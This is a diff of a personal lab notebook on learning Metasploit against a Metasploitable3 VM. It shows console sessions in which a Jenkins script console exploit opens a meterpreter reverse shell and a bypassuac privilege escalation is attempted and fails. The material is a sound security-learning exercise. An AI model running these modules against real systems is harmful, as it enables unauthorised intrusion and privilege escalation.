@@ -81,7 +81,7 @@ msf > db_nmap  55.55.55.5
 ```
 ## First succesfull exploit
 
-Here's brief instructions on how to use metasploit framework.
+Here's brief instructions on how to use metasploit framework. At this time, snort was not installed, as I just wanted to first learn how to use metasploit.
 
 ```
 fizzzzz: msfconsole 
@@ -162,9 +162,28 @@ msf exploit(jenkins_script_console) > exploit
 meterpreter > 
 ```
 
-Meterpreter console is additional part of metasploit and it's intention is to be stealthy console in remote machine. In example meterpreter is opened to a remote machine (the metasploittable3 vm via 55.55.55.5:8484), and it allows to do this for instance:
+Meterpreter console is additional part of metasploit and it's intention is to be stealthy console in remote machine. In example meterpreter is opened to a remote machine (the metasploittable3 vm via 55.55.55.5:8484). Now, because jenkins is not run with priviledged used we can't do anything really awesome directly (at least nothing that I'm aware of...).
 
+Next step of using metasploitable is exploits that need session such as we have opened. We can run exploit that needs open session (usually reverse shell?) like this:
+```
+msf > use exploit/windows/local/bypassuac
+msf exploit(bypassuac) > sessions
 
+Active sessions
+===============
+
+  Id  Type                     Information                                   Connection
+  --  ----                     -----------                                   ----------
+  2   meterpreter x86/windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  55.55.55.1:4444 -> 55.55.55.5:50400 (55.55.55.5)
+
+msf exploit(bypassuac) > set SESSION 2
+SESSION => 2
+msf exploit(bypassuac) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.11:4444 
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+```
 
 Additional important commands include but are not limited to: `back` (unsets current exploit), `edit` (edits exploit's code, usable for checking out what exploit actually does).
 
